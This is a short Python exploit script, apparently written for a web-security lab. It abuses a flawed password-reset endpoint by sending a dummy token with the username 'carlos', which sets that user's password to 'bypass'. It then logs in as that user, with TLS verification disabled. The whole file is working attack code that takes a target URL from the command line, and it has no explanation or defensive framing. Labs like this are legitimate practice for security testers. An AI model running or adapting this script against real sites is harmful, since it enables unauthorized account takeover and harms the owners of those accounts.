import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def password_rest(session,url):
    #change password
    url_reste=url+"/forgot-password?temp-forgot-password-token=x"
    #temp-forgot-password-token=x&username=carlos&new-password-1=new&new-password-2=new
    data={"temp-forgot-password-token":"x","username":"carlos","new-password-1":"bypass","new-password-2":"bypass"}
    response=session.post(url_reste,data=data,verify=False,allow_redirects=False)
    if response.status_code==302:
        print("(+) Password changed successfully .")
        print("(+) Trying to log log in .....")
        # log in 
        url_log=url+"/login"
        data_log={"username":"carlos","password":'bypass'}
        response_log=session.post(url_log,data=data_log,verify=False)
        if "Log out" in response_log.text:
            print('(+) Log in successfully .')
        else:
            print("(-) Error while trying to log in ")
    else:
        print('(-) Eroor while trying to change password')
        
def main():

    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    url=sys.argv[1]
    session=requests.session()
    password_rest(session,url)

if __name__ == "__main__":
    main()